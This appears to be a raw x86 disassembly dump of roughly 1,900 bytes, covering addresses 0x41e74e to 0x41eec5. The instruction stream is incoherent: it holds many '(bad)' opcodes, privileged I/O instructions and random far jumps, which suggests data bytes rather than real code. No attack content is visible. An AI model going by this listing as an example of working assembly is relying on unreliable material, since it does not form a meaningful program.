  41e74e:	jae    0x41e70d
  41e750:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e751:	adc    BYTE PTR [ecx],al
  41e753:	fnstsw WORD PTR [eax-0x637ca2bf]
  41e759:	or     al,BYTE PTR [edx-0x6140a046]
  41e75f:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41e761:	out    dx,al
  41e762:	lods   al,BYTE PTR ds:[esi]
  41e763:	pushw  ds
  41e765:	or     al,0x1e
  41e767:	stos   BYTE PTR es:[edi],al
  41e768:	mov    eax,0xe0834936
  41e76d:	dec    edx
  41e76e:	fnsave [di+0x6c9a]
  41e773:	out    0x63,al
  41e775:	xchg   ecx,eax
  41e776:	mov    eax,0xf9017468
  41e77b:	pop    esi
  41e77c:	ds ret 0xc5c
  41e780:	jmp    0xa6f6:0x6f416753
  41e787:	mov    esi,?
  41e789:	icebp  
  41e78a:	leave  
  41e78b:	mov    al,ds:0x98a17e8f
  41e790:	fwait
  41e791:	mov    al,ds:0xd4372ff8
  41e796:	add    edi,ebx
  41e798:	test   BYTE PTR [edi+0x587165a4],cl
  41e79e:	xor    al,0xdd
  41e7a0:	test   BYTE PTR [ebx],ch
  41e7a2:	pop    esi
  41e7a3:	enter  0x1293,0x2e
  41e7a7:	mov    ds:0xbaf5ce95,eax
  41e7ac:	push   ebx
  41e7ad:	add    al,0xf6
  41e7af:	dec    ebp
  41e7b0:	loope  0x41e7fc
  41e7b2:	repnz or BYTE PTR [ebx],al
  41e7b5:	dec    esi
  41e7b6:	inc    ebx
  41e7b7:	ret    0x93d2
  41e7ba:	fbstp  TBYTE PTR [edi+0x5eb1dab2]
  41e7c0:	cmp    DWORD PTR [ebp-0x149c2bfd],ebp
  41e7c6:	fs push es
  41e7c8:	or     eax,0x1d595c5
  41e7cd:	cmp    ebp,DWORD PTR [esi+0x2dfcd97]
  41e7d3:	dec    ebp
  41e7d4:	cs push ds
  41e7d6:	mov    esi,0xbf612409
  41e7db:	hlt    
  41e7dc:	or     al,ah
  41e7de:	add    DWORD PTR [esi+ebp*4+0xf],0x7f28acd8
  41e7e6:	and    esp,DWORD PTR [ecx+edi*8+0x5e1744de]
  41e7ed:	les    ecx,FWORD PTR [esi-0x31]
  41e7f0:	imul   DWORD PTR [ebx+eiz*1+0x16]
  41e7f4:	cmc    
  41e7f5:	cmp    BYTE PTR [ebp+0x4f],cl
  41e7f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7f9:	xor    eax,0x308698ec
  41e7fe:	lds    ecx,FWORD PTR [ebp-0xf]
  41e801:	push   eax
  41e802:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e803:	mov    esi,DWORD PTR [ebx-0x252afb9]
  41e809:	mov    al,ds:0x20c81494
  41e80e:	push   edx
  41e80f:	dec    ebx
  41e810:	aam    0xe
  41e812:	repnz es xchg esp,eax
  41e815:	js     0x41e836
  41e817:	hlt    
  41e818:	jp     0x41e856
  41e81a:	mov    eax,0xa93b3ac7
  41e81f:	mov    ?,WORD PTR ds:[edx]
  41e822:	push   esi
  41e823:	in     al,0x8f
  41e825:	push   edi
  41e826:	adc    ecx,DWORD PTR [esi+0x4922c0ac]
  41e82c:	inc    eax
  41e82d:	aam    0xaa
  41e82f:	jmp    0x41e860
  41e831:	adc    al,0xd2
  41e833:	xchg   edx,eax
  41e834:	adc    DWORD PTR [edx+0x75502f9],eax
  41e83a:	loope  0x41e84f
  41e83c:	sbb    DWORD PTR ds:0xa1f015e4,edx
  41e842:	adc    DWORD PTR [ebx-0x42cb93fc],ecx
  41e848:	aas    
  41e849:	lods   al,BYTE PTR ds:[esi]
  41e84a:	das    
  41e84b:	mov    cl,0x6b
  41e84d:	test   al,0xf3
  41e84f:	mov    edi,0x499a9d70
  41e854:	lds    eax,FWORD PTR [edi+ecx*4]
  41e857:	sub    eax,0x549bac95
  41e85c:	clc    
  41e85d:	ins    DWORD PTR es:[edi],dx
  41e85e:	sub    esp,ebx
  41e860:	ss mov bl,0x71
  41e863:	jg     0x41e8c8
  41e865:	dec    esp
  41e866:	mov    al,ds:0x51df828d
  41e86b:	or     ah,BYTE PTR [edi+0x193b7cd0]
  41e871:	dec    ebx
  41e872:	xchg   BYTE PTR [ecx+esi*4],bh
  41e875:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e877:	ds daa 
  41e879:	add    eax,DWORD PTR [eax]
  41e87b:	pusha  
  41e87c:	(bad)  
  41e87d:	sbb    BYTE PTR [ebx-0x17be9bb7],0xbc
  41e884:	jmp    0xdb206a02
  41e889:	push   eax
  41e88a:	dec    eax
  41e88b:	test   BYTE PTR [ebx],al
  41e88d:	sub    esp,DWORD PTR [esi-0x5e1aca80]
  41e893:	in     al,dx
  41e894:	pop    edi
  41e895:	mov    al,0x9c
  41e897:	cmc    
  41e898:	je     0x41e8c2
  41e89a:	and    ebp,0x4c
  41e89d:	mov    ss,WORD PTR [ecx]
  41e89f:	fisubr WORD PTR [edx]
  41e8a1:	inc    ebx
  41e8a2:	(bad)
  41e8a5:	rol    edi,0x81
  41e8a8:	test   BYTE PTR ds:0x5c08b178,ch
  41e8ae:	add    bh,bh
  41e8b0:	cli    
  41e8b1:	fcmove st,st(1)
  41e8b3:	add    eax,0x9ddc2ed3
  41e8b8:	aam    0x53
  41e8ba:	or     BYTE PTR [ebx-0x58],bl
  41e8bd:	push   ss
  41e8be:	mov    BYTE PTR [edx],ch
  41e8c0:	push   esi
  41e8c1:	mov    ebp,0x923fb06d
  41e8c6:	xchg   edi,eax
  41e8c7:	lahf   
  41e8c8:	cmc    
  41e8c9:	mov    ebx,0xc9a4a1be
  41e8ce:	and    dh,dh
  41e8d0:	push   esi
  41e8d1:	xchg   ebp,eax
  41e8d2:	int3   
  41e8d3:	xchg   edx,eax
  41e8d4:	mov    es,ebp
  41e8d6:	jmp    0x138f:0xe73c6d38
  41e8dd:	xchg   ecx,eax
  41e8de:	xor    eax,ebx
  41e8e0:	daa    
  41e8e1:	xor    al,BYTE PTR [ebp-0x45]
  41e8e4:	add    bh,bl
  41e8e6:	jmp    0x41e926
  41e8e8:	lahf   
  41e8e9:	jnp    0x41e956
  41e8eb:	jns    0x41e900
  41e8ed:	mov    edx,0x3d9e9c00
  41e8f2:	arpl   bx,ax
  41e8f4:	stc    
  41e8f5:	dec    esp
  41e8f6:	mov    al,ds:0xb1099686
  41e8fb:	rcr    BYTE PTR [edi-0x2ef98185],cl
  41e901:	mov    bl,0xa3
  41e903:	or     al,BYTE PTR [ecx]
  41e905:	aam    0x8
  41e907:	(bad)
  41e90b:	adc    bh,BYTE PTR [ebp+0x5d]
  41e90e:	sbb    ebp,DWORD PTR [edi-0x6]
  41e911:	fcomp  QWORD PTR [edi-0x41]
  41e914:	ins    BYTE PTR es:[edi],dx
  41e915:	out    0x47,eax
  41e917:	jmp    0x145c:0x961d3a87
  41e91e:	cmp    al,0xb4
  41e920:	aas    
  41e921:	mov    esi,0x986ab9b8
  41e926:	add    DWORD PTR [edi*2+0x7bb0c56c],esi
  41e92d:	loopne 0x41e977
  41e92f:	xor    edx,esi
  41e931:	bound  esi,QWORD PTR [ebx-0x36]
  41e934:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e935:	not    ecx
  41e937:	push   cs
  41e938:	mov    bl,0xd1
  41e93a:	dec    ebp
  41e93b:	das    
  41e93c:	xor    edx,DWORD PTR [edi+ecx*4+0x39]
  41e940:	test   esp,esp
  41e942:	and    eax,0xfaf2a722
  41e947:	dec    edi
  41e948:	popf   
  41e949:	xchg   edi,eax
  41e94a:	mov    bh,0x52
  41e94c:	int    0xab
  41e94e:	push   cs
  41e94f:	outs   dx,BYTE PTR ds:[esi]
  41e950:	or     al,0x81
  41e952:	hlt    
  41e953:	adc    BYTE PTR [esp+eiz*4-0x7530703e],ah
  41e95a:	mov    al,0x97
  41e95c:	push   0x456352e4
  41e961:	shrd   DWORD PTR [edi+0x1a],edi,cl
  41e965:	adc    DWORD PTR [eax-0x68bcb093],edx
  41e96b:	inc    esi
  41e96c:	jp     0x41e9b1
  41e96e:	push   esi
  41e96f:	and    al,0x8a
  41e971:	sbb    ebp,DWORD PTR [ecx]
  41e973:	jp     0x41e98a
  41e975:	or     DWORD PTR [esi+ebp*8+0x3472f1e7],0x6f410ab1
  41e980:	daa    
  41e981:	mov    eax,ds:0x7c580cd5
  41e986:	daa    
  41e987:	and    al,0x3c
  41e989:	cs pop edx
  41e98b:	cld    
  41e98c:	xor    al,BYTE PTR [edi+0x60]
  41e98f:	xor    DWORD PTR [edx],esp
  41e991:	mov    ds:0x373b1cea,eax
  41e996:	dec    ecx
  41e997:	cmp    ah,BYTE PTR [eax-0x4d837aab]
  41e99d:	xchg   edi,eax
  41e99e:	mov    ch,0xb4
  41e9a0:	sub    DWORD PTR [eax],ecx
  41e9a2:	push   ebp
  41e9a3:	les    ecx,FWORD PTR [ebx+esi*4]
  41e9a6:	cdq    
  41e9a7:	jp     0x41e9d9
  41e9a9:	sbb    dl,dl
  41e9ab:	and    eax,0xf687797b
  41e9b0:	pusha  
  41e9b1:	mov    ch,0xe6
  41e9b3:	lea    esp,[ecx]
  41e9b5:	push   edx
  41e9b6:	(bad)  
  41e9b9:	cmp    ah,dl
  41e9bb:	popa   
  41e9bc:	adc    eax,0xab0d2419
  41e9c1:	add    eax,0x5b51b0bb
  41e9c6:	push   0x3d
  41e9c8:	scas   eax,DWORD PTR es:[edi]
  41e9c9:	shr    DWORD PTR [eax+0x3a],0x39
  41e9cd:	jae    0x41ea13
  41e9cf:	das    
  41e9d0:	cld    
  41e9d1:	xor    BYTE PTR [esi-0x7],bh
  41e9d4:	loop   0x41e988
  41e9d6:	xor    esi,DWORD PTR [esi+ebx*1]
  41e9d9:	push   0xea5efcb5
  41e9de:	xor    eax,0x29cccd96
  41e9e3:	cmc    
  41e9e4:	fs fnsetpm(287 only) 
  41e9e7:	rcl    DWORD PTR [edi+0x3c17cc98],1
  41e9ed:	fisttp WORD PTR [ebp+0x6c]
  41e9f0:	ficom  WORD PTR [eax-0x6abac495]
  41e9f6:	sbb    DWORD PTR [esi],esi
  41e9f8:	fld    DWORD PTR [edx+0x29077bc]
  41e9fe:	mov    bl,0x9c
  41ea00:	ins    BYTE PTR es:[edi],dx
  41ea01:	cli    
  41ea02:	lods   eax,DWORD PTR ds:[esi]
  41ea03:	aad    0x53
  41ea05:	sub    eax,0xf524f6cc
  41ea0a:	int    0xe2
  41ea0c:	lods   al,BYTE PTR ds:[esi]
  41ea0d:	push   esi
  41ea0e:	push   edx
  41ea0f:	adc    DWORD PTR [edi+0x47b59358],ebp
  41ea15:	loope  0x41e9f9
  41ea17:	or     ch,BYTE PTR [eax+ebp*8]
  41ea1a:	jbe    0x41e9de
  41ea1c:	loop   0x41ea82
  41ea1e:	shr    DWORD PTR [esi+0x16c858e0],0xcc
  41ea25:	mov    edi,0x5508e3c3
  41ea2a:	cmp    BYTE PTR [ebp-0x57],bh
  41ea2d:	dec    ecx
  41ea2e:	pushf  
  41ea2f:	fcomp  QWORD PTR [esi]
  41ea31:	mov    cl,0x54
  41ea33:	adc    al,0x8e
  41ea35:	imul   ebx,DWORD PTR [ecx],0xab9c8272
  41ea3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea3c:	js     0x41ea88
  41ea3e:	fldcw  WORD PTR [eax+0x48]
  41ea41:	push   edx
  41ea42:	adc    DWORD PTR [ebx-0x32],esp
  41ea45:	(bad)  
  41ea46:	xor    al,0xa2
  41ea48:	mov    fs,ebx
  41ea4a:	ret    
  41ea4b:	and    ebp,DWORD PTR [esi+0x414d84e3]
  41ea51:	xlat   BYTE PTR ds:[ebx]
  41ea52:	and    DWORD PTR [edi+0x21dbb67d],0xffffffaf
  41ea59:	jmp    0x41e9fc
  41ea5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea5c:	dec    ebp
  41ea5d:	add    edx,DWORD PTR [ebx-0x549ecd9c]
  41ea63:	in     al,dx
  41ea64:	xchg   ecx,eax
  41ea65:	inc    esp
  41ea66:	retf   0x3686
  41ea69:	or     edx,esi
  41ea6b:	adc    esi,DWORD PTR [ebx-0x48d437e7]
  41ea71:	ret    
  41ea72:	stos   DWORD PTR es:[edi],eax
  41ea73:	push   ebp
  41ea74:	dec    ecx
  41ea75:	js     0x41ea2d
  41ea77:	fstp   QWORD PTR [esi-0x4e]
  41ea7a:	sar    al,0x61
  41ea7d:	lea    esp,[esi-0x71ade6c3]
  41ea83:	or     BYTE PTR [eax],bl
  41ea85:	jecxz  0x41eaf2
  41ea87:	je     0x41ea17
  41ea89:	cmp    esp,ebx
  41ea8b:	mov    eax,0x33f02ba8
  41ea90:	test   DWORD PTR [esp+edx*4],eax
  41ea93:	ins    BYTE PTR es:[edi],dx
  41ea94:	popa   
  41ea95:	addr16 push cs
  41ea97:	and    eax,0x28d645ac
  41ea9c:	ficomp WORD PTR [edx+eax*2+0x74]
  41eaa0:	repnz mov ds:0x41dc8bf0,eax
  41eaa6:	leave  
  41eaa7:	xchg   DWORD PTR [ebx+eiz*2-0x3ec4200f],edx
  41eaae:	std    
  41eaaf:	inc    eax
  41eab0:	shr    DWORD PTR [esi+edx*2-0x5c9d95a5],cl
  41eab7:	fwait
  41eab8:	push   edi
  41eab9:	ret    
  41eaba:	adc    BYTE PTR [ebx-0x6c],dh
  41eabd:	pop    esp
  41eabe:	lods   eax,DWORD PTR ds:[esi]
  41eabf:	cmp    edx,DWORD PTR [edi]
  41eac1:	sahf   
  41eac2:	mov    dh,0xe2
  41eac4:	push   esi
  41eac5:	enter  0xde08,0x29
  41eac9:	mov    esp,0x41d5e3f9
  41eace:	outs   dx,BYTE PTR ds:[esi]
  41eacf:	or     ebx,esi
  41ead1:	push   edx
  41ead2:	(bad)  
  41ead3:	in     al,dx
  41ead4:	cmpxchg DWORD PTR [ebx+esi*8],ebp
  41ead8:	jnp    0x41eb2d
  41eada:	ret    
  41eadb:	stos   BYTE PTR es:[edi],al
  41eadc:	mov    ecx,0x62a8ca0e
  41eae1:	fidivr DWORD PTR [ebx-0xbe927f5]
  41eae7:	add    bh,BYTE PTR [edi-0x37d4a48c]
  41eaed:	push   edx
  41eaee:	adc    edi,DWORD PTR [esi+0x2185d985]
  41eaf4:	cmp    eax,0x1fce7225
  41eaf9:	cmp    al,0x44
  41eafb:	into   
  41eafc:	sbb    DWORD PTR [ecx],0xffffff90
  41eaff:	aad    0xfb
  41eb01:	shr    dl,cl
  41eb03:	push   es
  41eb04:	lea    ebx,[ebp+0x5e]
  41eb07:	mov    ch,0x7a
  41eb09:	cwde   
  41eb0a:	mov    dl,0x71
  41eb0c:	addr16 push ebx
  41eb0e:	adc    eax,0x94d4568a
  41eb13:	pop    es
  41eb14:	in     al,dx
  41eb15:	repnz sub eax,0xb0d5fb0f
  41eb1b:	loopne 0x41eac8
  41eb1d:	mov    ch,0xd0
  41eb1f:	(bad)  
  41eb20:	push   edx
  41eb21:	mov    ah,0xec
  41eb23:	in     al,dx
  41eb24:	jo     0x41eb9c
  41eb26:	std    
  41eb27:	push   eax
  41eb28:	cvtdq2ps xmm2,XMMWORD PTR [ebx-0x56]
  41eb2c:	shl    BYTE PTR [esp+ebx*4+0x35],1
  41eb30:	xchg   edx,eax
  41eb31:	mov    bh,0x70
  41eb33:	sbb    DWORD PTR [ebx],esi
  41eb35:	imul   eax,DWORD PTR fs:[ecx+0x1b5325c0],0xffffffe3
  41eb3d:	push   ebx
  41eb3e:	mov    ch,0x1c
  41eb40:	jo     0x41eac7
  41eb42:	in     eax,dx
  41eb43:	mov    ebx,0x2ede0415
  41eb48:	ins    DWORD PTR es:[edi],dx
  41eb49:	xor    ch,BYTE PTR [ecx+0x7f]
  41eb4c:	mov    esi,DWORD PTR [esi]
  41eb4e:	or     DWORD PTR [eax-0x4daef7c],ebx
  41eb54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb55:	or     dh,BYTE PTR [ebx-0x50]
  41eb58:	xchg   ebx,eax
  41eb59:	sar    ah,0xc
  41eb5c:	or     DWORD PTR [eax+0x44204c63],0x1615ddb3
  41eb66:	push   edx
  41eb67:	std    
  41eb68:	push   esi
  41eb69:	fcomp  QWORD PTR [ebx-0x6d403237]
  41eb6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb70:	(bad)  
  41eb71:	lds    esi,FWORD PTR [ebx+0x48cb1b04]
  41eb77:	cdq    
  41eb78:	inc    edi
  41eb79:	fld    DWORD PTR [eax-0x3b]
  41eb7c:	sub    al,0xc8
  41eb7e:	dec    esp
  41eb7f:	call   0x89c:0x2461db96
  41eb86:	test   al,0x9c
  41eb88:	cwde   
  41eb89:	stc    
  41eb8a:	mov    ch,0x7f
  41eb8c:	sub    al,0xe2
  41eb8e:	dec    bl
  41eb90:	retf   0xb8fe
  41eb93:	and    ah,BYTE PTR [eax+0x6e88d681]
  41eb99:	jle    0x41ebf2
  41eb9b:	or     BYTE PTR [esi],dl
  41eb9d:	mov    bh,0xd5
  41eb9f:	or     DWORD PTR [ecx],eax
  41eba1:	cmp    cl,BYTE PTR [ecx+0x2a]
  41eba4:	adc    edx,DWORD PTR [eax-0x26]
  41eba7:	mov    al,ds:0x75da7812
  41ebac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebad:	retf   
  41ebae:	or     BYTE PTR [eax],ch
  41ebb0:	dec    ebx
  41ebb1:	out    dx,eax
  41ebb2:	sbb    BYTE PTR [eax+0x25],0xfd
  41ebb6:	les    edi,FWORD PTR [edi]
  41ebb8:	stos   BYTE PTR es:[edi],al
  41ebb9:	dec    esp
  41ebba:	mov    ebx,0xd4b87aee
  41ebbf:	repz pushf 
  41ebc1:	jnp    0x41ebed
  41ebc3:	call   0xf6f2:0x6144b87
  41ebca:	scas   al,BYTE PTR es:[edi]
  41ebcb:	gs (bad) 
  41ebcd:	adc    al,0x90
  41ebcf:	jne    0x41ec12
  41ebd1:	(bad)  
  41ebd2:	aad    0x2a
  41ebd4:	inc    dl
  41ebd6:	adc    eax,0xcef04671
  41ebdb:	clc    
  41ebdc:	out    dx,eax
  41ebdd:	sub    esi,ebp
  41ebdf:	cld    
  41ebe0:	push   ss
  41ebe1:	pop    eax
  41ebe2:	pop    ecx
  41ebe3:	jmp    0xdcc1:0xa252a305
  41ebea:	or     eax,0x6576c78e
  41ebef:	sub    eax,0xc0698564
  41ebf4:	xor    al,0x72
  41ebf6:	xor    al,0xf0
  41ebf8:	xchg   esi,eax
  41ebf9:	(bad)  
  41ebfa:	mov    bh,0x5d
  41ebfc:	enter  0x505b,0xde
  41ec00:	pop    ebp
  41ec01:	popf   
  41ec02:	sar    BYTE PTR [ebx-0x6ec36030],cl
  41ec08:	sbb    bl,al
  41ec0a:	je     0x41ec05
  41ec0c:	mov    cl,0xe
  41ec0e:	or     al,0xda
  41ec10:	mov    cl,0x7
  41ec12:	adc    DWORD PTR [ecx+0x2fcec578],ebp
  41ec18:	inc    eax
  41ec19:	cmp    BYTE PTR [ecx-0x5c],ch
  41ec1c:	cmp    BYTE PTR [ebx],dh
  41ec1e:	sbb    DWORD PTR [ebp+0x18fedb7a],ebx
  41ec24:	sbb    DWORD PTR [ebx],ebx
  41ec26:	sahf   
  41ec27:	xor    al,0xad
  41ec29:	jmp    DWORD PTR [edi-0x4f28eb5d]
  41ec2f:	mov    WORD PTR [esi+0x46],?
  41ec32:	xchg   ebp,eax
  41ec33:	push   ecx
  41ec34:	add    al,0xab
  41ec36:	or     ch,ah
  41ec38:	jmp    0x4a8f:0xe6e9ec70
  41ec3f:	sub    BYTE PTR [ecx+0x62fc1758],0x65
  41ec46:	ins    DWORD PTR es:[edi],dx
  41ec47:	call   0x4f33:0x1630c88f
  41ec4e:	jle    0x41ec2b
  41ec50:	sahf   
  41ec51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec52:	mov    eax,0x690250c
  41ec57:	leave  
  41ec58:	xlat   BYTE PTR ds:[ebx]
  41ec59:	out    0xdc,al
  41ec5b:	xchg   esi,eax
  41ec5c:	cmc    
  41ec5d:	adc    ebx,DWORD PTR [ebp-0x16d39c1c]
  41ec63:	push   edi
  41ec64:	jmp    0xdd9e:0x20d9e38b
  41ec6b:	outs   dx,DWORD PTR ds:[esi]
  41ec6c:	inc    ecx
  41ec6d:	daa    
  41ec6e:	rcl    DWORD PTR ds:0xe9b2d200,cl
  41ec74:	pushf  
  41ec75:	mov    eax,ds:0xd7811f7
  41ec7a:	icebp  
  41ec7b:	fwait
  41ec7c:	mov    bl,0x90
  41ec7e:	int    0xec
  41ec80:	cwde   
  41ec81:	ds or  eax,0x59f08729
  41ec87:	js     0x41ecb8
  41ec89:	out    dx,eax
  41ec8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec8b:	or     eax,0x21825d0b
  41ec90:	cmp    ebp,0x74ba8155
  41ec96:	xor    eax,0x98e3b5eb
  41ec9b:	and    ebx,DWORD PTR [edx+0x20b650a4]
  41eca1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eca2:	jecxz  0x41ec47
  41eca4:	cmp    al,0x67
  41eca6:	into   
  41eca7:	mov    ds:0xf87dab4b,eax
  41ecac:	fidiv  DWORD PTR [esi+0x2f]
  41ecaf:	fadd   QWORD PTR [ecx+0xb]
  41ecb2:	fnstsw WORD PTR [ebp-0x6c]
  41ecb5:	mov    ch,0x39
  41ecb7:	mov    al,0x26
  41ecb9:	test   eax,0xef7cc857
  41ecbe:	sbb    al,0xa4
  41ecc0:	stos   BYTE PTR es:[edi],al
  41ecc1:	pmaxub mm2,QWORD PTR [edi+0x72]
  41ecc5:	sbb    eax,0x127bf5e7
  41ecca:	sbb    al,0x45
  41eccc:	mov    bh,0x9b
  41ecce:	aas    
  41eccf:	popa   
  41ecd0:	(bad)
  41ecd4:	std    
  41ecd5:	xchg   edi,eax
  41ecd6:	popf   
  41ecd7:	xor    DWORD PTR ds:0xc1ba95f6,esp
  41ecdd:	int    0x1a
  41ecdf:	xor    DWORD PTR [edx+0x50be91f],0xc30fb747
  41ece9:	push   cs
  41ecea:	xchg   ebx,eax
  41eceb:	adc    edx,esi
  41eced:	repz pop esi
  41ecef:	loope  0x41ecf9
  41ecf1:	sbb    eax,esi
  41ecf3:	repz data16 sbb dh,BYTE PTR [ebx-0x46bc0f29]
  41ecfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ecfc:	xchg   edx,eax
  41ecfd:	nop
  41ecfe:	repz or bh,al
  41ed01:	lods   al,BYTE PTR ds:[esi]
  41ed02:	jae    0x41ecce
  41ed04:	mov    ?,WORD PTR [eax]
  41ed06:	and    DWORD PTR [ebp-0x63],edx
  41ed09:	add    al,0x7a
  41ed0b:	stos   DWORD PTR es:[edi],eax
  41ed0c:	mov    esp,DWORD PTR [edx+ebp*8+0x4a]
  41ed10:	inc    ecx
  41ed11:	adc    al,0x2e
  41ed13:	stos   BYTE PTR es:[edi],al
  41ed14:	rcl    DWORD PTR [ecx+0x786f7363],1
  41ed1a:	jle    0x41ed74
  41ed1c:	mov    cl,BYTE PTR [eax-0x50]
  41ed1f:	cmc    
  41ed20:	mov    ah,0x22
  41ed22:	bound  ecx,QWORD PTR [edx+0x3b275853]
  41ed28:	daa    
  41ed29:	rcl    BYTE PTR [ebp+0x65],cl
  41ed2c:	xchg   esi,eax
  41ed2d:	or     eax,0x21198898
  41ed32:	retf   0x196f
  41ed35:	cmc    
  41ed36:	shl    DWORD PTR [esi],cl
  41ed38:	mov    eax,0x868bca34
  41ed3d:	(bad)
  41ed40:	add    ecx,DWORD PTR [ecx-0x24326e6]
  41ed46:	mov    ch,0x94
  41ed48:	mov    cl,0xd8
  41ed4a:	cmp    eax,0xe133ff14
  41ed4f:	pop    esp
  41ed50:	xlat   BYTE PTR ds:[ebx]
  41ed51:	in     eax,0x6a
  41ed53:	cli    
  41ed54:	pop    esi
  41ed55:	call   0x6c07033
  41ed5a:	out    dx,eax
  41ed5b:	adc    ecx,edx
  41ed5d:	repnz mov BYTE PTR [esi+0x1c],al
  41ed61:	cmp    al,BYTE PTR [ecx]
  41ed63:	dec    edx
  41ed64:	shl    cl,1
  41ed66:	xchg   DWORD PTR [ebx-0xd],edi
  41ed69:	lods   al,BYTE PTR ds:[esi]
  41ed6a:	sub    eax,0x7adf1051
  41ed6f:	sar    eax,1
  41ed71:	push   ebp
  41ed72:	repnz test al,0xe7
  41ed75:	xchg   edx,eax
  41ed76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed77:	cmp    al,0xe0
  41ed7a:	fnstenv [edx+0x57481cdc]
  41ed80:	test   al,0xc
  41ed82:	xchg   DWORD PTR [esi],edx
  41ed84:	xchg   edi,eax
  41ed85:	push   0x57
  41ed87:	xor    bl,bl
  41ed89:	and    al,0xa1
  41ed8b:	pop    es
  41ed8c:	retf   
  41ed8d:	sub    ebx,ecx
  41ed8f:	leave  
  41ed90:	adc    al,0x6b
  41ed92:	cmc    
  41ed93:	and    DWORD PTR [eax-0x5b45cb04],ecx
  41ed99:	test   ah,ch
  41ed9b:	(bad)  
  41ed9c:	cwde   
  41ed9d:	shl    BYTE PTR [eax-0x51],1
  41eda0:	popa   
  41eda1:	mov    dh,0xb5
  41eda3:	fcom   DWORD PTR [edi+0x68]
  41eda6:	jo     0x41ed92
  41eda8:	mov    dl,0xbc
  41edaa:	xchg   ebp,eax
  41edab:	sub    esp,ebp
  41edad:	cmp    esp,DWORD PTR [ebx+0x54]
  41edb0:	sar    dh,cl
  41edb2:	addr16 jb 0x41ed94
  41edb5:	mov    edx,0xeef90894
  41edba:	dec    esp
  41edbb:	sbb    esi,DWORD PTR [esi+0x6851ad6b]
  41edc1:	out    0xea,eax
  41edc3:	adc    al,0x49
  41edc5:	xchg   ebp,eax
  41edc6:	std    
  41edc7:	mov    ecx,0xf265290f
  41edcc:	inc    ebp
  41edcd:	cmp    edi,edx
  41edcf:	mov    ch,0x4e
  41edd1:	mov    ah,0x3a
  41edd3:	and    edx,ebp
  41edd5:	sub    DWORD PTR [edi],eax
  41edd7:	das    
  41edd8:	rcr    DWORD PTR [edx],1
  41edda:	xchg   edi,eax
  41eddb:	call   0x32bb3a5f
  41ede0:	sub    ebp,eax
  41ede2:	push   es
  41ede3:	cmp    esp,DWORD PTR [ecx+esi*1+0x59]
  41ede7:	mov    eax,ds:0x5d9abaf
  41edec:	hlt    
  41eded:	mov    ebx,0x42fcada6
  41edf2:	popf   
  41edf3:	lods   eax,DWORD PTR ds:[esi]
  41edf4:	lea    eax,[ebp+0x7b92e766]
  41edfa:	dec    ebp
  41edfb:	inc    ebp
  41edfc:	call   0x5ac0:0xaa1f7f4
  41ee03:	add    bh,BYTE PTR [ecx+0x57ad1c44]
  41ee09:	adc    esp,DWORD PTR ds:0xd5e01291
  41ee0f:	mov    ds:0x54bae725,al
  41ee14:	loopne 0x41ee4b
  41ee16:	aaa    
  41ee17:	shl    DWORD PTR [ebp+edi*8+0x76deba54],1
  41ee1e:	aad    0xa8
  41ee20:	call   0x6558:0xa5e7587b
  41ee27:	je     0x41edab
  41ee29:	jbe    0x41ee64
  41ee2b:	jb     0x41ee18
  41ee2d:	add    esp,esi
  41ee2f:	jno    0x41ee0a
  41ee31:	sub    BYTE PTR [edi],ch
  41ee33:	or     al,0x9b
  41ee35:	jnp    0x41eea2
  41ee37:	sub    BYTE PTR [ebp+0x0],al
  41ee3a:	or     BYTE PTR [ebp-0x50],cl
  41ee3d:	shr    esp,1
  41ee3f:	sbb    eax,ecx
  41ee41:	cld    
  41ee42:	cs (bad) 
  41ee44:	pusha  
  41ee45:	mov    edi,0x7185a872
  41ee4a:	mov    ds:0x219270e3,eax
  41ee4f:	add    al,dl
  41ee51:	xor    esi,DWORD PTR [ecx+ecx*4+0x31bd2913]
  41ee58:	fidiv  WORD PTR [eax+0x2f]
  41ee5b:	in     al,dx
  41ee5c:	jb     0x41eed0
  41ee5e:	mov    eax,0x980647df
  41ee63:	xor    DWORD PTR [edx-0x4599d3dc],0x31
  41ee6a:	sub    al,0xdb
  41ee6c:	pop    ss
  41ee6d:	jae    0x41ee92
  41ee6f:	push   ds
  41ee70:	out    dx,al
  41ee71:	leave  
  41ee72:	int    0x8b
  41ee74:	xor    bh,0x2b
  41ee77:	daa    
  41ee78:	loop   0x41ee04
  41ee7a:	mov    esi,0x6ed0b98b
  41ee7f:	inc    ebp
  41ee80:	stos   DWORD PTR es:[edi],eax
  41ee81:	xchg   edx,eax
  41ee82:	push   esi
  41ee83:	xchg   ebx,eax
  41ee84:	cmp    edx,DWORD PTR [ebp-0x6627aa86]
  41ee8a:	mov    WORD PTR [ecx],cs
  41ee8c:	mov    dh,ah
  41ee8e:	stos   DWORD PTR es:[edi],eax
  41ee8f:	fild   QWORD PTR [eax+eax*4]
  41ee92:	add    al,0x90
  41ee94:	mov    ebx,0x4679825f
  41ee99:	hlt    
  41ee9a:	out    0x55,al
  41ee9c:	addr16 pop ebp
  41ee9e:	ds push 0xf8a9d42b
  41eea4:	cld    
  41eea5:	nop
  41eea6:	and    al,0x54
  41eea8:	arpl   WORD PTR [ebp+0x64],sp
  41eeab:	mov    DWORD PTR [esi],edi
  41eead:	sar    DWORD PTR [ebx+ebx*2-0x16d2b635],1
  41eeb4:	call   0x2235:0x8a26e16c
  41eebb:	sub    al,0x4e
  41eebd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eebe:	adc    DWORD PTR [eax-0x79],ecx
  41eec1:	out    dx,al
  41eec2:	cli    
  41eec3:	and    esp,edx
  41eec5:	push   edx
